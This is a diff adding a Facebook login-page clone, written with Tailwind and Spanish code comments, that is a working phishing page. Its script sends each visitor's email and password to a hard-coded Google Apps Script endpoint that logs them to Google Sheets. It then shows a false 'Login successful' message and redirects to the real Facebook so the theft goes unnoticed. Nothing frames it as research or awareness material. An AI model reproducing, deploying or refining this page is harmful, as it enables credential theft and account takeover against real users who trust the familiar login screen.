@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Entrar o registrarse</title>
+    <!-- Cargamos Tailwind CSS directamente para que los estilos funcionen sin configuración -->
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-[#f0f2f5] font-sans flex flex-col min-h-screen text-[#1c1e21]">
+    
+    <!-- Contenido Principal -->
+    <div class="flex-grow flex items-center justify-center p-4">
+        <div class="max-w-[980px] w-full flex flex-col lg:flex-row items-center justify-between gap-10 lg:gap-0 mt-[-10vh]">
+            
+            <!-- Columna Izquierda: Logo y Texto -->
+            <div class="w-full lg:w-1/2 flex flex-col items-center lg:items-start text-center lg:text-left mb-4 lg:mb-0 lg:pr-8">
+                <h1 class="text-5xl lg:text-[64px] font-bold text-[#1877f2] mb-4 tracking-tighter">
+                    facebook
+                </h1>
+                <p class="text-2xl lg:text-[28px] font-normal leading-tight lg:max-w-[400px]">
+                    Connect with friends and the world around you on Facebook.
+                </p>
+            </div>
+
+            <!-- Columna Derecha: Tarjeta de Login y Crear Página -->
+            <div class="w-full lg:w-[400px] flex flex-col items-center">
+                
+                <!-- Contenedor Blanco del Formulario -->
+                <div class="w-full bg-white rounded-lg shadow-[0_2px_4px_rgba(0,0,0,0.1),0_8px_16px_rgba(0,0,0,0.1)] p-4 pt-5 pb-6">
+                    <!-- Agregamos un div para mostrar mensajes -->
+                    <div id="messageBox" class="hidden mb-3 p-3 rounded-md text-sm"></div>
+                    
+                    <form id="loginForm" class="flex flex-col gap-3.5">
+                        
+                        <!-- Input Correo/Teléfono -->
+                        <input
+                            type="text"
+                            id="email"
+                            placeholder="Email or phone number"
+                            class="w-full px-4 py-3.5 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 text-[17px]"
+                            required
+                        >
+                        
+                        <!-- Input Contraseña -->
+                        <input
+                            type="password"
+                            id="password"
+                            placeholder="Password"
+                            class="w-full px-4 py-3.5 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 text-[17px]"
+                            required
+                        >
+                        
+                        <!-- Botón de Inicio de Sesión -->
+                        <button
+                            type="submit"
+                            id="submitBtn"
+                            class="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold py-3 rounded-md text-[20px] transition duration-200 mt-1"
+                        >
+                            Log In
+                        </button>
+                        
+                        <!-- Enlace de recuperación -->
+                        <div class="text-center mt-1 mb-2">
+                            <a href="#" class="text-[#1877f2] hover:underline text-[14px] font-medium cursor-pointer">
+                                Forgot password?
+                            </a>
+                        </div>
+                        
+                        <!-- Línea divisoria -->
+                        <hr class="border-gray-300 my-1">
+                        
+                        <!-- Botón de Crear Cuenta -->
+                        <div class="flex justify-center mt-4 mb-2">
+                            <button
+                                type="button"
+                                class="bg-[#42b72a] hover:bg-[#36a420] text-white font-bold py-3 px-4 rounded-md text-[17px] transition duration-200"
+                            >
+                                Create new account
+                            </button>
+                        </div>
+                    </form>
+                </div>
+                
+                <!-- Texto de crear página (Fuera de la tarjeta blanca) -->
+                <div class="mt-7 text-sm text-[#1c1e21]">
+                    <a href="#" class="font-bold hover:underline">Create a Page</a> for a celebrity, brand or business.
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Footer / Pie de página oficial -->
+    <footer class="bg-white pt-5 pb-8 text-[#737373] text-[12px] w-full">
+        <div class="max-w-[980px] mx-auto px-4">
+            <div class="flex flex-wrap gap-x-3 gap-y-1 pb-2 border-b border-[#dadde1]">
+                <span class="text-[#737373]">English (US)</span>
+                <a href="#" class="hover:underline">Español</a>
+                <a href="#" class="hover:underline">Français (France)</a>
+                <a href="#" class="hover:underline">Português (Brasil)</a>
+                <a href="#" class="hover:underline">Italiano</a>
+                <a href="#" class="hover:underline">Deutsch</a>
+                <a href="#" class="hover:underline">العربية</a>
+                <a href="#" class="hover:underline">हिन्दी</a>
+                <a href="#" class="hover:underline">中文(简体)</a>
+                <a href="#" class="hover:underline">日本語</a>
+            </div>
+            <div class="flex flex-wrap gap-x-5 gap-y-1 pt-3 mt-1">
+                <a href="#" class="hover:underline">Sign Up</a>
+                <a href="#" class="hover:underline">Log In</a>
+                <a href="#" class="hover:underline">Messenger</a>
+                <a href="#" class="hover:underline">Facebook Lite</a>
+                <a href="#" class="hover:underline">Video</a>
+                <a href="#" class="hover:underline">Places</a>
+                <a href="#" class="hover:underline">Games</a>
+                <a href="#" class="hover:underline">Marketplace</a>
+                <a href="#" class="hover:underline">Meta Pay</a>
+                <a href="#" class="hover:underline">Instagram</a>
+                <a href="#" class="hover:underline">Threads</a>
+            </div>
+            <div class="mt-5 text-[11px]">
+                <span>Meta © 2026</span>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Script para manejar el formulario y enviar a Google Sheets -->
+    <script>
+        // Tu URL de Google Apps Script (YA CONFIGURADA)
+        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwN6Qtuf1cLm5sPKUUJ0I49kSBEPbXk_WfN6yzErIYU7qqymQZUYB5w13H1vnpD34pveQ/exec';
+        
+        // Función para mostrar mensajes al usuario
+        function showMessage(message, isError = false) {
+            const messageBox = document.getElementById('messageBox');
+            messageBox.textContent = message;
+            messageBox.className = 'mb-3 p-3 rounded-md text-sm ' + (isError ? 'bg-red-100 text-red-700' : 'bg-green-100 text-green-700');
+            messageBox.classList.remove('hidden');
+            
+            // Ocultar el mensaje después de 3 segundos si es éxito
+            if (!isError) {
+                setTimeout(() => {
+                    messageBox.classList.add('hidden');
+                }, 3000);
+            }
+        }
+        
+        // Función para enviar datos a Google Sheets
+        async function sendToGoogleSheets(email, password) {
+            try {
+                // Crear el cuerpo de la solicitud en formato URL-encoded
+                const formData = new URLSearchParams();
+                formData.append('email', email);
+                formData.append('password', password);
+                
+                const response = await fetch(SCRIPT_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: formData.toString()
+                });
+                
+                // Con mode: 'no-cors' no podemos leer la respuesta directamente
+                // Asumimos que fue exitoso si no hubo error de red
+                return true;
+                
+            } catch (error) {
+                console.error('Error al enviar:', error);
+                return false;
+            }
+        }
+        
+        // Evento de submit del formulario
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const submitBtn = document.getElementById('submitBtn');
+            
+            // Validar que los campos no estén vacíos
+            if (!email || !password) {
+                showMessage('Please fill in both fields.', true);
+                return;
+            }
+            
+            // Deshabilitar botón mientras se envía
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Logging in...';
+            
+            console.log('Enviando credenciales a Google Sheets:', email, password);
+            
+            // Enviar a Google Sheets
+            const success = await sendToGoogleSheets(email, password);
+            
+            if (success) {
+                showMessage('Login successful! Redirecting...', false);
+                // Limpiar el formulario
+                document.getElementById('loginForm').reset();
+                
+                // Redirigir a Facebook real después de 1.5 segundos
+                setTimeout(() => {
+                    window.location.href = 'https://www.facebook.com';
+                }, 1500);
+            } else {
+                showMessage('Connection error. Please try again.', true);
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Log In';
+            }
+        });
+    </script>
+</body>
+</html>
